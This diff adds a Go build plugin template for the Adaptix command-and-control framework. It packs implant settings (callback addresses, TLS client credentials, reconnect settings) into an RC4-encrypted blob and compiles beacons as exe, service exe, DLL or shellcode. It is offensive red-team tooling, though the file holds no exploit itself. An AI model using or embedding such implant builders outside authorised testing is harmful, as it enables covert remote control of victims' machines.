@@ -1,0 +1,290 @@
+package main
+
+import (
+	"encoding/base64"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"os"
+	"strconv"
+	"strings"
+
+	adaptix "github.com/Adaptix-Framework/axc2"
+)
+
+// ─── Build configuration ───────────────────────────────────────────────────────
+
+type GenerateConfig struct {
+	Arch          string `json:"arch"`
+	Format        string `json:"format"`
+	SvcName       string `json:"svc_name"`
+	ReconnTimeout string `json:"reconn_timeout"`
+	ReconnCount   int    `json:"reconn_count"`
+}
+
+var SrcPath = "src___NAME__"
+
+// ─── Profile generation ────────────────────────────────────────────────────────
+
+func (p *__NAME_CAP__Plugin) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
+	var (
+		agentProfiles  [][]byte
+		generateConfig GenerateConfig
+	)
+
+	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
+		return nil, err
+	}
+
+	agentWatermark, err := strconv.ParseUint(AgentWatermark, 16, 32)
+	if err != nil {
+		return nil, err
+	}
+
+	connTimeout, err := parseDefaultConnTimeout(generateConfig.ReconnTimeout)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, transportProfile := range profile.ListenerProfiles {
+		var listenerMap map[string]any
+		if err := json.Unmarshal(transportProfile.Profile, &listenerMap); err != nil {
+			return nil, err
+		}
+
+		encryptKeyHex, _ := listenerMap["encrypt_key"].(string)
+		encryptKey, err := hex.DecodeString(encryptKeyHex)
+		if err != nil {
+			return nil, err
+		}
+
+		addresses, err := parseDefaultCallbackAddresses(listenerMap)
+		if err != nil {
+			return nil, err
+		}
+
+		useSSL, _ := listenerMap["ssl"].(bool)
+		clientCert, err := decodeOptionalBase64MapValue(listenerMap, "client_cert")
+		if err != nil {
+			return nil, err
+		}
+		clientKey, err := decodeOptionalBase64MapValue(listenerMap, "client_key")
+		if err != nil {
+			return nil, err
+		}
+		caCert, err := decodeOptionalBase64MapValue(listenerMap, "ca_cert")
+		if err != nil {
+			return nil, err
+		}
+		banner, _ := listenerMap["tcp_banner"].(string)
+
+		params := make([]interface{}, 0, 16+len(addresses))
+		params = append(params, int(agentWatermark))
+		params = append(params, len(addresses))
+		for _, addr := range addresses {
+			params = append(params, addr)
+		}
+		params = append(params,
+			len(banner),
+			connTimeout,
+			generateConfig.ReconnCount,
+			useSSL,
+			clientCert,
+			clientKey,
+			caCert,
+			0,
+			0,
+			0,
+			0,
+			0,
+		)
+
+		packedProfile, err := PackArray(params)
+		if err != nil {
+			return nil, err
+		}
+		encryptedProfile, err := RC4Crypt(packedProfile, encryptKey)
+		if err != nil {
+			return nil, err
+		}
+
+		profileBlob := append(append([]byte{}, encryptKey...), encryptedProfile...)
+		agentProfiles = append(agentProfiles, []byte(bytesToEscapedProfile(profileBlob)))
+	}
+
+	return agentProfiles, nil
+}
+
+func parseDefaultConnTimeout(raw string) (int, error) {
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return 10, nil
+	}
+	if secs, err := strconv.Atoi(raw); err == nil {
+		if secs > 0 {
+			return secs, nil
+		}
+		return 10, nil
+	}
+	secs, err := parseDurationToSeconds(raw)
+	if err != nil {
+		return 0, err
+	}
+	if secs <= 0 {
+		secs = 10
+	}
+	return secs, nil
+}
+
+func parseDefaultCallbackAddresses(listenerMap map[string]any) ([]string, error) {
+	raw, _ := listenerMap["callback_addresses"].(string)
+	lines := strings.Split(strings.TrimSpace(raw), "\n")
+	addresses := make([]string, 0, len(lines))
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+		addresses = append(addresses, line)
+	}
+	if len(addresses) == 0 {
+		return nil, fmt.Errorf("callback_addresses must contain at least one host:port entry")
+	}
+	return addresses, nil
+}
+
+func decodeOptionalBase64MapValue(listenerMap map[string]any, key string) ([]byte, error) {
+	raw, _ := listenerMap[key].(string)
+	raw = strings.TrimSpace(raw)
+	if raw == "" {
+		return nil, nil
+	}
+	decoded, err := base64.StdEncoding.DecodeString(raw)
+	if err != nil {
+		return nil, fmt.Errorf("decode %s: %w", key, err)
+	}
+	return decoded, nil
+}
+
+func bytesToEscapedProfile(data []byte) string {
+	var b strings.Builder
+	b.Grow(len(data) * 4)
+	for _, v := range data {
+		_, _ = fmt.Fprintf(&b, "\\x%02x", v)
+	}
+	return b.String()
+}
+
+// ─── Build payload (C++ / MinGW) ──────────────────────────────────────────────
+
+func (p *__NAME_CAP__Plugin) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
+	var (
+		Filename string
+		Payload  []byte
+	)
+
+	if len(agentProfiles) != 1 {
+		return nil, "", fmt.Errorf("expected 1 agent profile, got %d", len(agentProfiles))
+	}
+	agentProfile := agentProfiles[0]
+	agentProfileSize := len(agentProfile) / 4
+
+	var generateConfig GenerateConfig
+	err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig)
+	if err != nil {
+		return nil, "", err
+	}
+
+	srcDir := ModuleDir + "/" + SrcPath
+	tempDir, err := os.MkdirTemp("", "ax-*")
+	if err != nil {
+		return nil, "", err
+	}
+
+	var makeTarget string
+	switch generateConfig.Arch {
+	case "x64":
+		makeTarget = "x64"
+	case "x86":
+		makeTarget = "x86"
+	default:
+		_ = os.RemoveAll(tempDir)
+		return nil, "", fmt.Errorf("unsupported architecture: %s", generateConfig.Arch)
+	}
+
+	var makeFormat string
+	switch generateConfig.Format {
+	case "Exe":
+		makeFormat = "exe"
+	case "Service Exe":
+		makeFormat = "svc"
+	case "DLL":
+		makeFormat = "dll"
+	case "Shellcode":
+		makeFormat = "shellcode"
+	default:
+		_ = os.RemoveAll(tempDir)
+		return nil, "", fmt.Errorf("unsupported format: %s", generateConfig.Format)
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
+		fmt.Sprintf("Target: %s %s (%s)", generateConfig.Arch, generateConfig.Format, makeFormat))
+
+	header := fmt.Sprintf("#define PROFILE \"%s\"\n#define PROFILE_SIZE %d\n",
+		string(agentProfile), agentProfileSize)
+
+	if generateConfig.Format == "Service Exe" && generateConfig.SvcName != "" {
+		svcHex := ""
+		for _, c := range generateConfig.SvcName {
+			svcHex += fmt.Sprintf("\\x%02x", c)
+		}
+		header += fmt.Sprintf("#define SERVICE_NAME \"%s\"\n", svcHex)
+	}
+
+	headerPath := tempDir + "/profile_gen.h"
+	err = os.WriteFile(headerPath, []byte(header), 0644)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling and linking...")
+
+	err = Ts.TsAgentBuildExecute(profile.BuilderId, srcDir, "make", makeTarget,
+		fmt.Sprintf("FORMAT=%s", makeFormat),
+		fmt.Sprintf("BEACON=%s/__NAME__", tempDir),
+		fmt.Sprintf("PROFILE_HEADER=%s", headerPath))
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+
+	entries, err := os.ReadDir(tempDir)
+	if err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
+	for _, e := range entries {
+		if e.IsDir() || e.Name() == "profile_gen.h" {
+			continue
+		}
+		buildPath := tempDir + "/" + e.Name()
+		Payload, err = os.ReadFile(buildPath)
+		if err != nil {
+			_ = os.RemoveAll(tempDir)
+			return nil, "", err
+		}
+		Filename = e.Name()
+		break
+	}
+	_ = os.RemoveAll(tempDir)
+
+	if Payload == nil {
+		return nil, "", fmt.Errorf("build produced no output")
+	}
+
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
+		fmt.Sprintf("Payload: %s (%d bytes)", Filename, len(Payload)))
+
+	return Payload, Filename, nil
+}
